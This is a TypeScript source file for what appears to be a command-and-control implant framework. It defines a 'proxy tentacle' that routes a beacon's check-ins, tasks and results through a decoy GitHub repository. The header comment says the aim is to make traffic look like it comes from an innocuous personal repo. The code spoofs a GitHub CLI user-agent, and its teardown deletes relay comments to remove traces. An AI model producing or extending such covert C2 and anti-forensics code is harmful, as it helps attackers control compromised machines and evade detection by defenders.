/**
 * OctoProxyTentacle (Tentacle 10)
 *
 * Delegation wrapper that routes all sync traffic through a forwarding
 * GitHub repository instead of the main repo. This makes node traffic
 * appear to originate from an innocuous personal repo (dotfiles, config
 * snippets, etc.).
 *
 * The proxy substitutes only the `repo` coordinates and optionally the token;
 * all other BeaconConfig fields (id, keyPair, sleepSeconds, etc.) are
 * preserved. The inner tentacle (IssuesTentacle or NotesTentacle) handles
 * all actual GitHub API calls — OctoProxyTentacle makes none of its own.
 *
 * Design:
 *   innerConfig   — BeaconConfig with proxy owner/repo/token substituted in
 *   innerKindName — "IssuesTentacle" | "NotesTentacle" (exposed for testing)
 *   inner         — the actual ITentacle that performs all operations
 */

import { Octokit } from "@octokit/rest";
import type { BeaconConfig, ProxyConfig, CheckinPayload, Task, TaskResult, ITentacle } from '../types.ts';
import { IssuesTentacle } from './IssuesTentacle.ts';
import { NotesTentacle } from './NotesTentacle.ts';
import { buildTokenGetter } from '../lib/AppTokenManager.ts';

export class OctoProxyTentacle implements ITentacle {
  readonly kind = "proxy" as const;

  /** The config used to construct the inner tentacle (proxy coords substituted in). */
  readonly innerConfig: BeaconConfig;

  /** Class name of the inner tentacle — exposed for testing. */
  readonly innerKindName: string;

  private readonly inner: ITentacle;
  private readonly proxyConfig: ProxyConfig;

  constructor(config: BeaconConfig, proxyConfig: ProxyConfig) {
    this.proxyConfig = proxyConfig;
    this.innerConfig = {
      ...config,
      repo:  { owner: proxyConfig.owner, name: proxyConfig.repo },
      token: proxyConfig.token ?? config.token,
    };

    if (proxyConfig.innerKind === 'notes') {
      this.innerKindName = 'NotesTentacle';
      this.inner         = this.createInner(proxyConfig.innerKind, this.innerConfig);
    } else {
      this.innerKindName = 'IssuesTentacle';
      this.inner         = this.createInner('issues', this.innerConfig);
    }
  }

  /**
   * Factory method — overridable in tests to inject mock inner tentacles.
   */
  protected createInner(kind: 'issues' | 'notes', cfg: BeaconConfig): ITentacle {
    return kind === 'notes' ? new NotesTentacle(cfg) : new IssuesTentacle(cfg);
  }

  isAvailable(): Promise<boolean>                    { return this.inner.isAvailable(); }
  checkin(payload: CheckinPayload): Promise<Task[]>  { return this.inner.checkin(payload); }
  submitResult(result: TaskResult): Promise<void>    { return this.inner.submitResult(result); }

  /**
   * Build the Octokit instance used by teardown() for direct proxy-repo API calls.
   *
   * Uses AppTokenManager when `proxyConfig.appConfig` is present; falls back
   * to the static PAT otherwise.  Protected so tests can override it.
   *
   * @param _buildTokenGetter - Injectable for testing; defaults to the real buildTokenGetter.
   */
  protected async buildTeardownOctokit(
    _buildTokenGetter: typeof buildTokenGetter = buildTokenGetter,
  ): Promise<Octokit> {
    const appCfg = this.proxyConfig.appConfig;
    const numericAppId  = appCfg ? Number(appCfg.appId) : 0;
    const numericInstId = appCfg ? Number(appCfg.installationId) : 0;
    if (appCfg && (isNaN(numericAppId) || numericAppId === 0 || isNaN(numericInstId) || numericInstId === 0)) {
      throw new Error(`[RelayChannel] Invalid App credentials: appId=${appCfg.appId}, installationId=${appCfg.installationId}`);
    }
    const tokenGetter = appCfg
      ? _buildTokenGetter({
          token:          this.proxyConfig.token ?? this.innerConfig.token,
          appId:          numericAppId,
          installationId: numericInstId,
          appPrivateKey:  appCfg.privateKey,
        })
      : _buildTokenGetter({
          token: this.proxyConfig.token ?? this.innerConfig.token,
        });
    const token = await tokenGetter();
    return new Octokit({
      auth: token,
      headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
    });
  }

  async teardown(): Promise<void> {
    await this.inner.teardown();

    // Best-effort cleanup: delete all comments on the forward issue, then close it.
    try {
      const owner = this.proxyConfig.owner;
      const repo  = this.proxyConfig.repo;
      if (!owner || !repo) return;

      // Resolve the issue number from the inner tentacle if it is an IssuesTentacle.
      let issueNumber: number | null = null;
      if (this.inner instanceof IssuesTentacle) {
        issueNumber = this.inner.currentIssueNumber;
      }
      if (!issueNumber) return;

      const octokit = await this.buildTeardownOctokit();

      // Fetch all comments on the forward issue.
      let comments: Array<{ id: number }> = [];
      try {
        const resp = await octokit.rest.issues.listComments({
          owner, repo,
          issue_number: issueNumber,
          per_page: 100,
        });
        comments = resp.data;
      } catch (err) {
        console.warn("[RelayChannel] teardown: could not list forward issue comments:", (err as Error).message);
      }

      // Delete each comment individually.
      for (const comment of comments) {
        try {
          await octokit.rest.issues.deleteComment({ owner, repo, comment_id: comment.id });
        } catch {
          // best-effort
        }
      }

      // Close the forward issue.
      try {
        await octokit.rest.issues.update({
          owner, repo,
          issue_number: issueNumber,
          state: "closed",
        });
        console.log(`[RelayChannel] teardown: closed forward issue #${issueNumber} on ${owner}/${repo}`);
      } catch (err) {
        console.warn("[RelayChannel] teardown: could not close forward issue:", (err as Error).message);
      }
    } catch {
      // best-effort — never let cleanup failures propagate
    }
  }
}
